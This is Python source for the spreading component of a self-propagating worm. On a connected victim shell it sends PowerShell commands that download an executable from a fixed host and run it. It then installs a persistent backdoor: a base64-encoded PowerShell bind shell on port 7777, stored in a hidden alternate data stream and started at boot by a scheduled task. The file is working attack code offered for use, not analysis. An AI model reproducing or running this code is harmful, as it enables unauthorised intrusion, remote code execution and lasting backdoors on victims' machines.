import socket, threading
import time
from replicate import replicate
from deployment import deployment


class tunnel(threading.Thread):
    
    def __init__(self, worm, lhost="0.0.0.0", lport=1337):
        self.worm = worm
        self.lhost = lhost
        self.lport = lport
        self.sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.sock.bind((self.lhost,self.lport))
        self.sock.listen(5)
        print("Establishing Tunnel - listening on port {}".format(self.lport))
        self.connection = {}
        super().__init__()
    
    
    def run(self):
        print("accepting traffic on port {}".format(self.lport))
        conn, addr = self.sock.accept()
        conn.settimeout(10)
        self.set_connection(conn,addr)
        print("Got a connection from: {}",addr)
        self.deploy_virus(self.worm.getfiledata(),conn)
        self.create_persistence(conn)
        conn.close()
        self.sock.close()
    
    
    def sent_command(self, command, conn):
        print(command)
        conn.send(command)
        time.sleep(1)
        
    def sent_large_command(self, command, conn):
        #print(command)
        total_sent = 0
        while total_sent < len(command):
            sent = conn.send(command[total_sent:])
            if sent == 0:
                raise RuntimeError("socket connection broken")
            total_sent = total_sent + sent
        
    def get_response(self,conn,size=1024):
        response = conn.recv(size).decode()
        return response

    def get_done(self):
        return self.complete
    # def delivery_virus(self, target_ip, virus):
    #     self.get_connection(target_ip).sendall(virus)


    def generate_base64_bind_shell_code(self, ostype:str):
        if ostype == "windows":
            bind_shell = ""
            bind_shell += "JABsAGkAcwB0AGUAbgBlAHIAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBr"
            bind_shell += "AGUAdABzAC4AVABjAHAATABpAHMAdABlAG4AZQByACgAJwAwAC4AMAAuADAALgAwACcALAA3ADcANwA3ACkAOwAkAGwAaQBzAHQA"
            bind_shell += "ZQBuAGUAcgAuAFMAdABhAHIAdAAoACkAOwB3AGgAaQBsAGUAIAAoACQAdAByAHUAZQApACAAewAkAGMAbABpAGUAbgB0ACAAPQAg"
            bind_shell += "ACQAbABpAHMAdABlAG4AZQByAC4AQQBjAGMAZQBwAHQAVABjAHAAQwBsAGkAZQBuAHQAKAApADsAJABzAHQAcgBlAGEAbQAgAD0A"
            bind_shell += "IAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAg"
            bind_shell += "ADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEA"
            bind_shell += "ZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAJABk"
            bind_shell += "AGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUA"
            bind_shell += "eAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAg"
            bind_shell += "ACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQA"
            bind_shell += "LQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABT"
            bind_shell += "ACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsA"
            bind_shell += "dABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABi"
            bind_shell += "AGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQA"
            bind_shell += "YgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAu"
            bind_shell += "AEMAbABvAHMAZQAoACkAOwB9ACQAbABpAHMAdABlAG4AZQByAC4AUwB0AG8AcAAoACkAOwA="
            return bind_shell
        elif ostype == "linux":
            return ""
        else:
            return ""

    def create_persistence(self, conn):
        #creating a backdoor access on the remote server
        command = b"powershell -encodedcommand "
        command += self.generate_base64_bind_shell_code("windows").encode()
        command+=b"\n"
        self.sent_command(command,conn)
        print("Create a Bind Shell on Port 7777")
        print(self.get_response(conn,5120))

        command = b'Set-Content -path "$env:temp\\remain.tmp:hidden" -Value "'
        command += self.generate_base64_bind_shell_code("windows").encode()
        command += b'"'
        self.sent_large_command(command,conn)
        print("Store Base64 Bind Shell in Temp Folder")
        print(self.get_response(conn,5120))
        
        command = b'schtasks /create /tn "reminderr" /tr "powershell -Command \"$command=get-content $env:\\temp:hidden; powershell -encodedcommand $command\"" /sc onstart'
        self.sent_command(command,conn)
        print("Create a Schedule Tasks to Start the Bind Shell on Boot")
        print(self.get_response(conn,1024))
    
    def deploy_virus(self, data, conn, ostype="windows"):
        #print(data)
        server = deployment("0.0.0.0",8081,data)
        server.start()
        
        if ostype=="windows":
            self.depoly_to_windows(conn)
        else:
            self.deploy_to_linux(conn)
            
            
    def depoly_to_windows(self,conn):
        #start command sequence
        try:
            print("Start Deploying worm to Windows")
            command = "cd \\Users\Public".encode()
            command+=b"\n"
            self.sent_command(command,conn)
            print("change to users directory")
            print(self.get_response(conn,1024))
            command = "powershell".encode()
            command+=b"\n"
            self.sent_command(command,conn)
            print("run powershell")
            print("Target Response: {}".format(self.get_response(conn)))
            command = '$client = New-Object System.Net.Sockets.TcpClient;'
            command += '$client.Connect("192.168.56.108", 8081); '
            command += '$stream = $client.GetStream(); '
            command += '$buffer = New-Object byte[] 1024; '
            command += '$receivedBytes = 0; '
            command += '$totalBytes = 0; '
            command += '$file = New-Object System.IO.FileStream("'+self.lhost+'_tworm.exe", [System.IO.FileMode]::Create); '
            command += 'do { $receivedBytes = $stream.Read($buffer, 0, 1024); '
            command += '$totalBytes += $receivedBytes; '
            command += '$file.Write($buffer, 0, $receivedBytes); } '
            command += 'while ($receivedBytes -ne 0); '
            command += '$file.Close(); '
            command += '$client.Close();'
            command = command.encode()
            command+=b"\n"
            self.sent_command(command,conn)
            print("target machine is starting to connect to the us")
            print("Target Response: {}".format(self.get_response(conn,1024)))
            time.sleep(5)
            command = "./{}_tworm.exe".format(self.lhost).encode()
            command+=b"\n"
            self.sent_command(command,conn)
            print("Target Response: {}".format(self.get_response(conn,1024)))
            
        except TimeoutError as t:
            print("no Response")
            
            
    def depoly_to_linux(self, conn):
        pass        
    
    
    def set_connection(self, conn, addr):
        self.connection[addr] = conn


    def get_connection(self, target_ip):
        if target_ip in self.connection:
            return self.connection[target_ip]
        else:
            print("target connection does not exists {}".format(target_ip))
            return None


    def close_connection(self,client_ip):
        conn = self.get_connection(client_ip)
        if conn != None:
            conn.close()
        self.sock.close()
        
